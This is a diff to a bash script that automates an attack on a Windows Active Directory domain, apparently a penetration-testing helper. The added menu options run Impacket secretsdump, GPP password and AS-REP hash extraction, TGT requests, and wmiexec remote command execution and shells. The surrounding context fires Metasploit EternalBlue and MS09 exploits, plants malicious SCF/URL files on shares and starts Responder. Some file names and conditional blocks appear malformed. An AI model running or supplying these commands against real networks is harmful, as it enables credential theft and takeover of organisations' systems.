@@ -361,6 +361,7 @@ if [ $answer == 2 ]; then
 	CRACKLDAP="crackmapexec ldap $DOMAINIP -u $USER -p $PASS "
 	IMP="Impacket.txt"
 	I=impacket
+	IDUP="$DOMAIN/$USER:$PASS"
 	MSF="msfconsole -x "
 	ETERNAL="use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
 	MS09="use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
@@ -468,6 +469,53 @@ Command=ToggleDesktop" > @evil.scf
 		fi
 	fi
 
+	if [ $answer == 4 ]; then
+		ls -la $IMP.txt
+		if [ $? != 0 ]; then
+			touch $IMP.txt
+		fi
+		$I-GetADUsers "$IDUP" -dc-ip $DOMAINIP -all >> $IMP.txt
+		$I-findDelegation "$IDUP" -dc-ip $DOMAINIP >> $IMP.txt
+		$I-Get-GPPPassword "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP >> $IMP.txt
+		$I-secretsdump "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP >> $IMP.txt
+		secretsdump.py "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP >> $IMP.txt
+		$I-GetNPUsers "$IDUP@$DOMAINIP" -request -dc-ip $DOMAINIP >> $IMP.txt
+		$I-GetTGT "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP >> $IMP.txt
+		$I-mssqlinstance $DOMAINIP >> $IMP.txt
+		$C"Trying to run whoami with wmiexec"; $RE
+		$I-wmiexec "$IDUP@$DOMAINIP" whoami -dc-ip $DOMAINIP 
+		$C"Trying to launch semi-interactive shell"; $RE
+		$I-wmiexec "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP 
+	fi
+
+	if [ $answer == 5 ]; then
+		which bloodhound-python
+		if [ $? != 0 ]; then
+			$R"You need to download first, restart script and run download tools"; $RE
+			exit
+		fi
+		mkdir blood
+		cd blood
+		bloodhound-python -u $USER -p $PASS -ns $DOMAINIP -d $DOMAIN -c all
+		cd ..
+		read -p "Would you like to start a neo4j console and bloodhound for you (y/n)"
+		if [ $answer == y ]; then
+			terminator --new-tab -e "sudo neo4j console"
+			terminator --new-tab -e "bloodhound"
+		fi
+	fi
+
+	if [ $answer == 6 ]; then
+		mkdir ldap
+		cd ldap
+		$LDAPWPASS
+		cd ..
+		$C"Opening LDAP in Firefox, saved everything in ldap folder"
+		firefox ldap/*.html
+	fi
+
+	
+
 	if [ $answer == A ]; then
 		$Y"Lean with it, rock with it
 		When we gonna stop with it?
@@ -510,6 +558,13 @@ Command=ToggleDesktop" > @evil.scf
 		"Upload @evil.url to Remote Share"; $RE
 		terminator --new-tab -e "sudo responder -I $INT -wv"
 
+		mkdir ldap
+		cd ldap
+		$LDAPWPASS
+		cd ..
+		$C"Opening LDAP in Firefox, saved everything in ldap folder"
+		firefox ldap/*.html
+
 		nmap -p 445 --script=smb-vuln* -Pn >> $DOMAINIP.txt
 		if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
 			$MSF$ETERNAL
@@ -518,7 +573,38 @@ Command=ToggleDesktop" > @evil.scf
 		else
 			$R"Looks like we cannot get easy wins in Eternal Blue or MS09"; $RE
 		fi
+		ls -la $IMP.txt
+		if [ $? != 0 ]; then
+			touch $IMP.txt
+		fi
+		$I-GetADUsers "$IDUP" -dc-ip $DOMAINIP -all >> $IMP.txt
+		$I-findDelegation "$IDUP" -dc-ip $DOMAINIP >> $IMP.txt
+		$I-Get-GPPPassword "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP >> $IMP.txt
+		$I-secretsdump "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP >> $IMP.txt
+		secretsdump.py "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP >> $IMP.txt
+		$I-GetNPUsers "$IDUP@$DOMAINIP" -request -dc-ip $DOMAINIP >> $IMP.txt
+		$I-GetTGT "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP >> $IMP.txt
+		$I-mssqlinstance $DOMAINIP >> $IMP.txt
+		$C"Trying to run whoami with wmiexec"; $RE
+		$I-wmiexec "$IDUP@$DOMAINIP" whoami -dc-ip $DOMAINIP 
+		$C"Trying to launch semi-interactive shell"; $RE
+		$I-wmiexec "$IDUP@$DOMAINIP" -dc-ip $DOMAINIP 
 
+		which bloodhound-python
+		if [ $? != 0 ]; then
+			$R"You need to download first, restart script and run download tools"; $RE
+			exit
+		fi
+		mkdir blood
+		cd blood
+		bloodhound-python -u $USER -p $PASS -ns $DOMAINIP -d $DOMAIN -c all
+		cd ..
+		read -p "Would you like to start a neo4j console and bloodhound for you (y/n)"
+		if [ $answer == y ]; then
+			terminator --new-tab -e "sudo neo4j console"
+			terminator --new-tab -e "bloodhound"
+		fi
+	fi
 
 		$CRACKSMB --shares >> $IMP
 		$CRACKSMB --sessions >> $IMP
